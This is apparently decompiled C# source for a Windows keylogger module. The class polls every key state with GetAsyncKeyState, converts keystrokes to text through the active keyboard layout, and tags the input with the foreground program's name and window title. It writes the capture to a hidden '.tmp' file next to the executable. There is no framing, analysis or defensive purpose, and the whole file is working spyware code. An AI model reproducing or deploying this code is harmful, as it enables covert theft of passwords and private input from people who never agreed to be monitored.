using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ClassLibrary1;

public class kl
{
	private Keys keys_0;

	public Clock Clock;

	public string Logs;

	private Keyboard keyboard_0;

	public string LogsPath;

	internal int int_0;

	internal string string_0;

	public kl()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		keys_0 = (Keys)0;
		Clock = new Clock();
		Logs = "";
		keyboard_0 = new Keyboard();
		LogsPath = Application.get_ExecutablePath() + ".tmp";
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_1);

	private string method_0()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process processById = Process.GetProcessById(int_);
			if (!(((foregroundWindow.ToInt32() == int_0) & (Operators.CompareString(string_0, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				int num = (int_0 = foregroundWindow.ToInt32());
				string text = (string_0 = processById.MainWindowTitle);
				return "\r\n\u0001" + method_1() + " " + processById.ProcessName + " " + string_0 + "\u0001\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string method_1()
	{
		try
		{
			return Clock.get_LocalTime().ToString("yy/MM/dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "??/??/??";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_0(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	private string method_2(Keys keys_1)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Invalid comparison between Unknown and I4
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Invalid comparison between Unknown and I4
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Invalid comparison between Unknown and I4
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Invalid comparison between Unknown and I4
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Invalid comparison between Unknown and I4
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Invalid comparison between Unknown and I4
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Invalid comparison between Unknown and I4
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Invalid comparison between Unknown and I4
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Invalid comparison between Unknown and I4
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Invalid comparison between Unknown and I4
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Invalid comparison between Unknown and I4
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Invalid comparison between Unknown and I4
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Invalid comparison between Unknown and I4
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Invalid comparison between Unknown and I4
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Invalid comparison between Unknown and I4
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Invalid comparison between Unknown and I4
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Invalid comparison between Unknown and I4
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Invalid comparison between Unknown and I4
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected I4, but got Unknown
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Expected I4, but got Unknown
		bool flag = keyboard_0.get_ShiftKeyDown();
		if (keyboard_0.get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)keys_1 != 112 && (int)keys_1 != 113 && (int)keys_1 != 114 && (int)keys_1 != 115 && (int)keys_1 != 116 && (int)keys_1 != 117 && (int)keys_1 != 118 && (int)keys_1 != 119 && (int)keys_1 != 120 && (int)keys_1 != 121 && (int)keys_1 != 122 && (int)keys_1 != 123 && (int)keys_1 != 35 && (int)keys_1 != 46 && (int)keys_1 != 8)
			{
				if ((int)keys_1 != 160 && (int)keys_1 != 161 && (int)keys_1 != 65536 && (int)keys_1 != 16 && (int)keys_1 != 131072 && (int)keys_1 != 17 && (int)keys_1 != 163 && (int)keys_1 != 162 && (int)keys_1 != 262144)
				{
					if ((int)keys_1 == 32)
					{
						return " ";
					}
					if ((int)keys_1 != 13 && (int)keys_1 != 13)
					{
						if ((int)keys_1 == 9)
						{
							return "[TAP]\r\n";
						}
						checked
						{
							if (flag)
							{
								return smethod_0((uint)keys_1).ToUpper();
							}
							return smethod_0((uint)keys_1);
						}
					}
					if (Logs.EndsWith("[ENTER]\r\n"))
					{
						return "";
					}
					return "[ENTER]\r\n";
				}
				return "";
			}
			return "[" + ((Enum)keys_1).ToString() + "]";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)keys_1).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void WRK()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Logs = File.ReadAllText(LogsPath);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys keys_ = (Keys)num2;
							string text = method_2(keys_);
							if (text.Length > 0)
							{
								Logs += method_0();
								Logs += text;
							}
							keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (Logs.Length > 20480)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						File.WriteAllText(LogsPath, Logs);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
